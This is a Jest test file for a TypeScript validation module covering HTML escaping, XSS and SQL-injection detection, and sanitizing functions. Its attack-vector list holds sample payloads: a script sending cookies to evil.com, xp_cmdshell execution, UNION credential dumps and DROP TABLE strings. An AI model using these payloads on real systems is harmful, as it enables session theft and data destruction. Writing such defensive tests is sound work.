import { validate } from '../utils/validation'

describe('Security - XSS Protection', () => {
  describe('escapeHtml', () => {
    it('should escape < and > characters', () => {
      expect(validate.escapeHtml('<script>')).toBe('&lt;script&gt;')
    })

    it('should escape quotes', () => {
      expect(validate.escapeHtml('"test"')).toBe('&quot;test&quot;')
      expect(validate.escapeHtml("'test'")).toBe('&#x27;test&#x27;')
    })

    it('should escape ampersand', () => {
      expect(validate.escapeHtml('a & b')).toBe('a &amp; b')
    })

    it('should escape forward slash', () => {
      expect(validate.escapeHtml('a/b')).toBe('a&#x2F;b')
    })

    it('should handle empty string', () => {
      expect(validate.escapeHtml('')).toBe('')
    })

    it('should handle non-string input', () => {
      expect(validate.escapeHtml(null as unknown as string)).toBe('')
      expect(validate.escapeHtml(undefined as unknown as string)).toBe('')
      expect(validate.escapeHtml(123 as unknown as string)).toBe('')
    })

    it('should escape complex HTML', () => {
      const input = '<div onclick="alert(1)">Test</div>'
      const output = validate.escapeHtml(input)
      expect(output).not.toContain('<')
      expect(output).not.toContain('>')
      expect(output).not.toContain('"')
    })
  })

  describe('containsXSS', () => {
    it('should detect script tags', () => {
      expect(validate.containsXSS('<script>alert(1)</script>')).toBe(true)
      expect(validate.containsXSS('<SCRIPT>alert(1)</SCRIPT>')).toBe(true)
    })

    it('should detect javascript: protocol', () => {
      expect(validate.containsXSS('javascript:alert(1)')).toBe(true)
      expect(validate.containsXSS('JAVASCRIPT:void(0)')).toBe(true)
    })

    it('should detect event handlers', () => {
      expect(validate.containsXSS('onclick=alert(1)')).toBe(true)
      expect(validate.containsXSS('onmouseover=hack()')).toBe(true)
      expect(validate.containsXSS('onerror = malicious()')).toBe(true)
    })

    it('should detect iframe tags', () => {
      expect(validate.containsXSS('<iframe src="evil.com">')).toBe(true)
    })

    it('should detect object/embed tags', () => {
      expect(validate.containsXSS('<object data="evil.swf">')).toBe(true)
      expect(validate.containsXSS('<embed src="evil.swf">')).toBe(true)
    })

    it('should detect data: protocol', () => {
      expect(validate.containsXSS('data:text/html,<script>alert(1)</script>')).toBe(true)
    })

    it('should detect vbscript: protocol', () => {
      expect(validate.containsXSS('vbscript:msgbox(1)')).toBe(true)
    })

    it('should detect link and meta tags', () => {
      expect(validate.containsXSS('<link rel="stylesheet" href="evil.css">')).toBe(true)
      expect(validate.containsXSS('<meta http-equiv="refresh">')).toBe(true)
    })

    it('should return false for safe strings', () => {
      expect(validate.containsXSS('Hello World')).toBe(false)
      expect(validate.containsXSS('user@email.com')).toBe(false)
      expect(validate.containsXSS('This is a normal prompt')).toBe(false)
    })

    it('should handle non-string input', () => {
      expect(validate.containsXSS(null as unknown as string)).toBe(false)
      expect(validate.containsXSS(undefined as unknown as string)).toBe(false)
    })
  })

  describe('sanitizeXSS', () => {
    it('should remove script tags', () => {
      expect(validate.sanitizeXSS('<script>alert(1)</script>test')).toBe('test')
    })

    it('should remove event handlers', () => {
      const input = 'hello onclick=alert(1) world'
      const output = validate.sanitizeXSS(input)
      expect(output).not.toContain('onclick')
    })

    it('should remove javascript: protocol', () => {
      const input = 'click javascript:alert(1) here'
      const output = validate.sanitizeXSS(input)
      expect(output).not.toContain('javascript:')
    })

    it('should preserve safe content', () => {
      expect(validate.sanitizeXSS('Hello World')).toBe('Hello World')
      expect(validate.sanitizeXSS('user@email.com')).toBe('user@email.com')
    })

    it('should handle empty input', () => {
      expect(validate.sanitizeXSS('')).toBe('')
    })

    it('should handle non-string input', () => {
      expect(validate.sanitizeXSS(null as unknown as string)).toBe('')
    })
  })
})

describe('Security - SQL Injection Protection', () => {
  describe('containsSQLInjection', () => {
    it('should detect SELECT statements', () => {
      expect(validate.containsSQLInjection('SELECT * FROM users')).toBe(true)
      expect(validate.containsSQLInjection('select id from users')).toBe(true)
    })

    it('should detect INSERT statements', () => {
      expect(validate.containsSQLInjection("INSERT INTO users VALUES ('hack')")).toBe(true)
    })

    it('should detect UPDATE statements', () => {
      expect(validate.containsSQLInjection("UPDATE users SET admin=1")).toBe(true)
    })

    it('should detect DELETE statements', () => {
      expect(validate.containsSQLInjection('DELETE FROM users')).toBe(true)
    })

    it('should detect DROP statements', () => {
      expect(validate.containsSQLInjection('DROP TABLE users')).toBe(true)
      expect(validate.containsSQLInjection('drop database main')).toBe(true)
    })

    it('should detect UNION attacks', () => {
      expect(validate.containsSQLInjection("1 UNION SELECT * FROM passwords")).toBe(true)
    })

    it('should detect SQL comments', () => {
      expect(validate.containsSQLInjection('admin--')).toBe(true)
      expect(validate.containsSQLInjection('admin/*comment*/')).toBe(true)
    })

    it('should detect OR 1=1 attacks', () => {
      expect(validate.containsSQLInjection("' OR 1=1")).toBe(true)
      expect(validate.containsSQLInjection("' AND 1=1")).toBe(true)
    })

    it('should detect quotes and semicolons', () => {
      expect(validate.containsSQLInjection("admin'; DROP TABLE users;")).toBe(true)
      expect(validate.containsSQLInjection('test`backtick')).toBe(true)
    })

    it('should detect ALTER and TRUNCATE', () => {
      expect(validate.containsSQLInjection('ALTER TABLE users')).toBe(true)
      expect(validate.containsSQLInjection('TRUNCATE users')).toBe(true)
    })

    it('should detect EXEC and GRANT/REVOKE', () => {
      expect(validate.containsSQLInjection('EXEC sp_executesql')).toBe(true)
      expect(validate.containsSQLInjection('GRANT ALL ON users')).toBe(true)
      expect(validate.containsSQLInjection('REVOKE SELECT ON users')).toBe(true)
    })

    it('should return false for safe strings', () => {
      expect(validate.containsSQLInjection('Hello World')).toBe(false)
      expect(validate.containsSQLInjection('john.doe@email.com')).toBe(false)
      // Note: Some words like "selection" might trigger false positives
    })

    it('should handle non-string input', () => {
      expect(validate.containsSQLInjection(null as unknown as string)).toBe(false)
      expect(validate.containsSQLInjection(undefined as unknown as string)).toBe(false)
    })
  })

  describe('sanitizeForDB', () => {
    it('should escape single quotes', () => {
      expect(validate.sanitizeForDB("O'Brien")).toBe("O''Brien")
      expect(validate.sanitizeForDB("It's")).toBe("It''s")
    })

    it('should handle multiple quotes', () => {
      expect(validate.sanitizeForDB("It's John's")).toBe("It''s John''s")
    })

    it('should trim whitespace', () => {
      expect(validate.sanitizeForDB('  test  ')).toBe('test')
    })

    it('should handle empty string', () => {
      expect(validate.sanitizeForDB('')).toBe('')
    })

    it('should handle non-string input', () => {
      expect(validate.sanitizeForDB(null as unknown as string)).toBe('')
    })
  })
})

describe('Security - Combined Sanitization', () => {
  describe('sanitizeSafe', () => {
    it('should return null for XSS attacks', () => {
      expect(validate.sanitizeSafe('<script>alert(1)</script>')).toBe(null)
      expect(validate.sanitizeSafe('onclick=alert(1)')).toBe(null)
    })

    it('should return null for SQL injection', () => {
      expect(validate.sanitizeSafe("'; DROP TABLE users;--")).toBe(null)
      expect(validate.sanitizeSafe('SELECT * FROM users')).toBe(null)
    })

    it('should escape HTML for safe input', () => {
      const result = validate.sanitizeSafe('Hello <World>')
      // Contains < so will be detected as potential XSS (link tag pattern)
      // Actually, just < without full tag should pass
      expect(validate.sanitizeSafe('Hello World')).toBe('Hello World')
    })

    it('should respect maxLength', () => {
      const input = 'a'.repeat(100)
      const result = validate.sanitizeSafe(input, 50)
      expect(result?.length).toBe(50)
    })

    it('should handle non-string input', () => {
      expect(validate.sanitizeSafe(null as unknown as string)).toBe(null)
    })
  })

  describe('sanitizeUserInput', () => {
    it('should remove XSS and escape HTML', () => {
      const result = validate.sanitizeUserInput('Hello <b>World</b>')
      expect(result).not.toContain('<')
      expect(result).not.toContain('>')
    })

    it('should remove script tags', () => {
      const input = 'test<script>alert(1)</script>hello'
      const result = validate.sanitizeUserInput(input)
      expect(result).not.toContain('script')
      expect(result).toContain('test')
      expect(result).toContain('hello')
    })

    it('should respect maxLength', () => {
      const input = 'a'.repeat(1000)
      const result = validate.sanitizeUserInput(input, 100)
      expect(result.length).toBeLessThanOrEqual(100)
    })

    it('should trim whitespace', () => {
      expect(validate.sanitizeUserInput('  hello  ')).toBe('hello')
    })

    it('should handle empty string', () => {
      expect(validate.sanitizeUserInput('')).toBe('')
    })

    it('should handle non-string input', () => {
      expect(validate.sanitizeUserInput(null as unknown as string)).toBe('')
    })
  })
})

describe('Security - Real World Attack Vectors', () => {
  const attackVectors = [
    // XSS Attacks
    { input: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>', type: 'XSS' },
    { input: '<img src=x onerror=alert(1)>', type: 'XSS' },
    { input: '<svg onload=alert(1)>', type: 'XSS' },
    { input: '<body onload=alert(1)>', type: 'XSS' },
    { input: '<iframe src="javascript:alert(1)">', type: 'XSS' },
    { input: '<a href="javascript:alert(1)">click</a>', type: 'XSS' },
    { input: '"><script>alert(String.fromCharCode(88,83,83))</script>', type: 'XSS' },
    { input: '<IMG SRC="javascript:alert(\'XSS\');">', type: 'XSS' },

    // SQL Injection Attacks
    { input: "' OR '1'='1", type: 'SQL' },
    { input: "1; DROP TABLE users", type: 'SQL' },
    { input: "admin'--", type: 'SQL' },
    { input: "1 UNION SELECT username,password FROM users", type: 'SQL' },
    { input: "'; EXEC xp_cmdshell('dir'); --", type: 'SQL' },
    { input: "1' AND 1=1 UNION SELECT NULL,table_name FROM information_schema.tables--", type: 'SQL' },
  ]

  it('should detect all XSS attack vectors', () => {
    const xssAttacks = attackVectors.filter(v => v.type === 'XSS')
    xssAttacks.forEach(attack => {
      const detected = validate.containsXSS(attack.input)
      expect(detected).toBe(true)
    })
  })

  it('should detect all SQL injection attack vectors', () => {
    const sqlAttacks = attackVectors.filter(v => v.type === 'SQL')
    sqlAttacks.forEach(attack => {
      const detected = validate.containsSQLInjection(attack.input)
      expect(detected).toBe(true)
    })
  })

  it('should sanitize all attack vectors safely', () => {
    attackVectors.forEach(attack => {
      const result = validate.sanitizeSafe(attack.input)
      // Should either return null (blocked) or sanitized safe string
      if (result !== null) {
        expect(validate.containsXSS(result)).toBe(false)
      }
    })
  })
})

describe('Security - Edge Cases', () => {
  it('should handle unicode characters', () => {
    expect(validate.sanitizeUserInput('Xin chào 你好 مرحبا')).toBe('Xin chào 你好 مرحبا')
  })

  it('should handle emojis', () => {
    expect(validate.sanitizeUserInput('Hello 👋 World 🌍')).toBe('Hello 👋 World 🌍')
  })

  it('should handle newlines and tabs', () => {
    const input = 'line1\nline2\ttab'
    const result = validate.sanitizeUserInput(input)
    expect(result).toContain('\n')
    expect(result).toContain('\t')
  })

  it('should handle very long input', () => {
    const longInput = 'a'.repeat(10000)
    const result = validate.sanitizeUserInput(longInput, 500)
    expect(result.length).toBe(500)
  })

  it('should handle mixed safe and unsafe content', () => {
    const input = 'Hello <script>evil()</script> World'
    const result = validate.sanitizeUserInput(input)
    expect(result).toContain('Hello')
    expect(result).toContain('World')
    expect(result).not.toContain('script')
  })

  it('should handle case variations', () => {
    expect(validate.containsXSS('<ScRiPt>alert(1)</ScRiPt>')).toBe(true)
    expect(validate.containsSQLInjection('SeLeCt * FrOm users')).toBe(true)
  })

  it('should handle URL-encoded attacks (after decoding)', () => {
    // Note: This tests the pattern after URL decoding would happen
    const decoded = '<script>alert(1)</script>'
    expect(validate.containsXSS(decoded)).toBe(true)
  })
})
